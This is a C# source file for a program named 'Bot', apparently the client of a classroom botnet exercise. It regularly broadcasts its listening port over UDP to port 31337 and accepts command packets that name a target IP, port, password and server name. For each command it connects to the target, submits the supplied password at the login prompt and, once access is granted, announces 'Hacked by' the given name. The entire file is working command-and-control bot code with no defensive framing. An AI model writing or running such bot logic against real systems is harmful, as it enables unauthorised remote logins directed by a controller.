using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;


namespace Bot
{
    class Program
    {
        private static System.Timers.Timer aTimer;
        private static UdpClient client;
        private static byte[] bytes;
        private static IPEndPoint ipDestination;

        static void Main(string[] args)
        {
            Random r = new Random();
            int port = 0; //port 
            IPGlobalProperties ipGlobalProperties = IPGlobalProperties.GetIPGlobalProperties();
            IPEndPoint[] udpConnInfoArray = ipGlobalProperties.GetActiveUdpListeners();
            port = RandomPort(port, r, udpConnInfoArray);
            Console.WriteLine("Bot is listening on port " + port);

            Thread t = new Thread(() => {
                client = new UdpClient();
                ipDestination = new IPEndPoint(IPAddress.Broadcast, 31337);
                bytes = Encoding.ASCII.GetBytes(port + "");
                SetTimer(); //define a timer to 10 sec 
                Console.ReadLine();
            });
            t.Start();

            ListenToServer(port);

        }
        private static void ListenToServer(int port)
        {
            UdpClient udpListener = new UdpClient(port);
            byte[] data = new byte[1024];
            IPEndPoint sender = new IPEndPoint(IPAddress.Any, 0);
            TcpClient client;
            while (true)
            {
                data = udpListener.Receive(ref sender);
                string[] splitData = SplitData(data);
                client = new TcpClient(splitData[0], Int32.Parse(splitData[1]));
                NetworkStream ns = client.GetStream();
                byte[] bytes2 = new byte[1024];
                ns.Read(bytes2, 0, bytes2.Length);
                string msg = Encoding.ASCII.GetString(bytes2).Replace("\0", string.Empty);
                ns.Flush();
                if (msg.Equals("Please enter your password\r\n"))
                {
                    byte[] myWriteBuffer = Encoding.ASCII.GetBytes(splitData[2] + "\r\n");
                    ns.Write(myWriteBuffer, 0, myWriteBuffer.Length);
                    ns.Flush();
                }
                else
                {
                    ns.Close();
                    client.Close();
                }
                byte[] bytes3 = new byte[1024];
                ns.Read(bytes3, 0, bytes3.Length);
                msg = Encoding.ASCII.GetString(bytes3).Replace("\0", string.Empty);
                ns.Flush();
                if (msg.Equals("Access granted\r\n"))
                {
                    byte[] myWriteBuffer = Encoding.ASCII.GetBytes("Hacked by " + splitData[3].TrimEnd() + "\r\n");
                    ns.Write(myWriteBuffer, 0, myWriteBuffer.Length);
                    ns.Flush();
                }
                ns.Close();
                client.Close();
            }
        }

        private static string[] SplitData(byte[] data)
        {
            //Console.WriteLine(data.Length);
            string ip = "";
            for (int i = 0; i < 4; i++)
            {
                ip = ip + data[i];
                if (i != 3)
                {
                    ip = ip + ".";
                }
            }
            string Port = BitConverter.ToUInt16(new byte[2] { data[4], data[5] }, 0) + "";
            string pass = "";
            for (int i = 6; i < 12; i++)
            {
                pass = pass + (char)data[i];
            }
            string nameServer = "";

            for (int i = 12; i < 44; i++)
            {
                nameServer = nameServer + (char)data[i];
            }
            return (new string[4] { ip, Port, pass, nameServer });
        }

        private static void SetTimer()
        {
            // Create a timer with a two second interval.
            aTimer = new System.Timers.Timer(10000);
            // Hook up the Elapsed event for the timer. 
            aTimer.Elapsed += OnTimedEvent;
            aTimer.AutoReset = true;
            aTimer.Enabled = true;
        }

        private static void OnTimedEvent(Object source, ElapsedEventArgs e)
        {
            try
            {
                client.Send(bytes, bytes.Length, ipDestination);
                //Console.WriteLine("sent");
            }
            catch (Exception E)
            {
                Console.WriteLine("failed"); // nee delete
            }
        }

        private static int RandomPort(int port, Random r, IPEndPoint[] udpConnInfoArray)
        {
            bool isAvailable = false;
            while (!isAvailable)
            {
                port = r.Next(0, 60000);
                isAvailable = true;
                foreach (IPEndPoint udp in udpConnInfoArray)
                {
                    if (udp.Port == port)
                    {
                        isAvailable = false;
                        break;
                    }
                }
            }
            return port;
        }
    }
}